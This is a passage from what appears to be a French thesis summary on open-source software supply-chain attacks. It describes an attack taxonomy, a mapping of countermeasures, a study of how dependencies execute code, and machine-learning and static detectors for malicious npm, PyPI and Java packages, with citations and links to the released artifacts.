Orion de SolarWinds[3] , téléchargée par environ 18 000 clients, y compris des agences gouvernementales et des fournisseurs d'infrastructures critiques, démontrent la portée et l'impact potentiel de telles attaques. Les chaînes d'approvisionnement des logiciels open-source ont également été significativement impactées par ces types d'attaques, et cette tendance est en augmentation. La gravité de ce problème est soulignée par la suspension en mai 2023 des nouvelles inscriptions d'utilisateurs et des téléchargements de paquets sur PyPI en raison d'une augmentation significative des activités malveillantes[4] . 

Cette exploitation de la « trusting trust », mise en évidence par Ken Thompson dès 1984[5] , a fait des attaques contre la chaîne d'approvisionnement des logiciels l'une des premières menaces dans le panorama actuel des menaces, comme l'a signalé l'ENISA[6] . En raison du rôle central des logiciels libres dans l'économie moderne et dans l'industrie du logiciel, la protection de la chaîne d'approvisionnement des logiciels libres a suscité l'intérêt du public et fait désormais partie intégrante des programmes de sécurité nationale[7] . En conséquence, le monde universitaire a également commencé à étudier le problème et à définir des stratégies pour protéger la chaîne d'approvisionnement en logiciels. 

L'objectif principal de cette thèse est d'approfondir la question des attaques de la chaîne d'approvisionnement des logiciels libres, afin de mieux comprendre ces attaques et d'élaborer des stratégies pour les prévenir. 

Les attaquants poursuivent principalement des objectifs tels que l'exfiltration de données, les droppers, l'ouverture de shells inversés, le déni de service ou le gain financier. De plus, ils visent à diffuser des liens de phishing. En conséquence, les projets open-source avec une base d'utilisateurs plus large, y compris les utilisateurs directs et indirects, deviennent des cibles plus attrayantes pour les attaquants. Conformément aux stratégies adversaires observées dans d'autres domaines, les attaquants n'ont besoin d'exploiter qu'une seule vulnérabilité, tandis que les défenseurs sont chargés de protéger l'ensemble de la surface d'attaque. Dans ce contexte, la surface d'attaque englobe l'ensemble de la chaîne d'approvisionnement logicielle. Pour réussir une attaque de la chaîne d'approvisionnement des OSS, l'attaquant doit principalement remplir trois exigences : 

1. Rendre un paquet malveillant disponible pour les utilisateurs en aval, 

2. S'assurer que les utilisateurs en aval interagissent activement avec le paquet malveillant (par exemple, en l'installant), et 

> 3 S. Peisert, B. Schneier, H. Okhravi, et al., « Perspectives on the solarwinds inci- dent », IEEE Security Privacy, vol. 19, no. 2, pp. 7–13, 2021. doi: 10.1109/MSEC.2021.3051235. 

> 4 Pypi new user and new project registrations temporarily suspended, https://status.python.org/incidents/qy2t9mjjcc7g?u=l1b53kd6n2rs 

> 5 K. Thompson, « Reflections on trusting trust », Commun. ACM, vol. 27, no. 8, pp. 761–763, Aug. 1984, issn: 0001-0782. doi: 10.1145/358198.358210. 

> 6 European Network and Information Security Agency. « Enisa threat landscape 2021 ». 

> 7 Joseph R. Biden JR. « Executive order on improving the nation’s cybersecurity ». 

the-nations-cybersecurity/ 

3. S'assurer que les utilisateurs en aval exécutent finalement le code malveillant contenu dans le paquet. 

Ainsi, nous identifions les principaux problèmes à aborder dans le contexte de la sécurité de la chaîne d'approvisionnement des logiciels open-source : 

- Manque de taxonomie complète des attaques ; 

- Manque de cartographie complète des mesures de protection ; 

- Manque de description complète des techniques d'exécution des dépendances tierces ; 

- • Automatisation de la détection des attaques de la chaîne d'approvisionnement des OSS. 

L'objectif principal de cette thèse est d'explorer les attaques de la chaîne d'approvisionnement des OSS, en cherchant à comprendre ces attaques et à développer des stratégies pour les prévenir. Atténuer efficacement les attaques de la chaîne d'approvisionnement des logiciels open-source nécessite de tirer des enseignements des incidents passés et de fournir une vue d'ensemble complète de tous les vecteurs d'attaque potentiels que les attaquants utilisent pour injecter du code malveillant dans les composants open-source. De plus, en raison du volume considérable de code qui doit être analysé pour détecter un comportement malveillant, il est essentiel d'établir des approches automatisées pour détecter ce comportement dans les dépendances tierces. 

Pour améliorer la compréhension des attaques de la chaîne d'approvisionnement des OSS, les contributions de cette thèse sont les suivantes : 

- Une **taxonomie des vecteurs d’attaque sur la chaîne d'approvisionnement des OSS[8]** . Nous avons organisé et systématisé les connaissances existantes, aboutissant à la création d'une taxonomie des attaques de la chaîne d'approvisionnement des logiciels open-source. Prenant la forme d'un arbre d'attaque, elle couvre plus de 100 vecteurs uniques, liés à plus de 90 incidents réels et mis en correspondance avec plus de 33 mesures de protection. Des enquêtes menées auprès de 17 experts du domaine et de 134 développeurs de logiciels ont validé l'exactitude, l'exhaustivité et la compréhensibilité de la taxonomie, ainsi que son adéquation à divers cas d'utilisation. 

- Une **cartographie des mesures de protection existantes par rapport aux vecteurs d'attaque identifiés** , validée comme indiqué ci-dessus. 

- Une **compréhension de la manière dont les dépendances tierces parviennent à s'exécuter sur les systèmes en aval[9]** . 

> 8 Ladisa, P., Plate, H., Martinez, M., & Barais, O. (2023, May). Sok: Taxonomy of attacks on open-source software supply chains. In 2023 IEEE Symposium on Security and Privacy (SP) (pp. 1509-1526). IEEE. DOI: 10.1109/SP46215.2023. 10179304 

> 9 Ladisa, P., Sahin, M., Ponta, S. E., Rosa, M., Martinez, M., & Barais, O. (2023). The Hitchhiker’s Guide to Malicious Third-Party Dependencies. In Proceedings of the 2023 ACM Workshop on Software Supply Chain Okensive Research and Ecosystem Defenses. DOI: 10.1145/3605770.3625212 

Dans le cadre de notre contribution sur la taxonomie des vecteurs d'attaque et leurs contre-mesures, nous avons aussi développé un outil open-source appelé le “ **Risk Explorer for Software Supply Chains** ”[10] , qui est disponible en ligne et est open-source. Cet outil permet aux utilisateurs d'explorer de manière interactive la taxonomie des attaques de la chaîne d'approvisionnement des OSS et les informations associées (comme les possibles mesures de protection existantes par rapport aux vecteurs d’attaque). 

En ce qui concerne la compréhension de la manière dont les dépendances tierces peuvent exécuter un code arbitraire en aval, nous avons développé des exemples dans les différents écosystèmes analysés (par exemple Python, JavaScript, Go, Rust, Java) et les avons rendus open-source[11] . 

Dans le contexte de la prévention automatisée des attaques de la chaîne d'approvisionnement des OSS, les contributions de cette thèse sont les suivantes : 

• **Évaluation d’une approche basée sur l'apprentissage automatique pour la détection de paquets malveillants en JavaScript et Python[12]** . Notre objectif était d'évaluer la faisabilité de l'entraînement d'un modèle unifié capable d'identifier les paquets malveillants dans les deux écosystèmes. Grâce à une analyse empirique, impliquant le balayage quotidien des paquets téléchargés dans npm et PyPI à l'aide de notre classificateur, nous avons réussi à détecter et à signaler rapidement 58 instances de logiciels malveillants précédemment inconnus. 

- **Évaluation d’une approche statique pour la détection de paquets malveillants en Java[13]** , en particulier une approche statique basée sur l'analyse du bytecode JVM pour mettre en évidence la présence d'indicateurs de comportements malveillants. 

Dans le cadre de l’évaluation d’une approche basée sur l'apprentissage automatique pour la détection de paquets malveillants en JavaScript et Python, pour rendre nos résultats vérifiables et reproductibles, nous avons open-sourcé le jeu de données d'entraînement, les modèles les plus performants utilisés dans notre expérience réelle, la liste des paquets malveillants identifiés et les scripts nécessaires pour reproduire et vérifier nos résultats[14] . 

> 10 https://sap.github.io/risk-explorer-for-software-supply-chains/ 

> 11 https://github.com/SAP-samples/risk-explorer-execution-pocs 

> 12 Ladisa, P., Ponta, S. E., Ronzoni, N., Martinez, M., & Barais, O. (2023, December). On the Feasibility of Cross-Language Detection of Malicious Packages in npm and PyPI. In Proceedings of the 39th Annual Computer Security Applications Conference. DOI: 10.1145/3627106.3627138 

> 13 Ladisa, P., Plate, H., Martinez, M., Barais, O., & Ponta, S. E. (2022, November). Towards the Detection of Malicious Java Packages. In Proceedings of the 2022 ACM Workshop on Software Supply Chain Okensive Research and Ecosystem Defenses (pp. 63-72). DOI: 10.1145/3560835.3564548 

> 14 https://github.com/SAP-samples/cross-language-detection-artifacts 

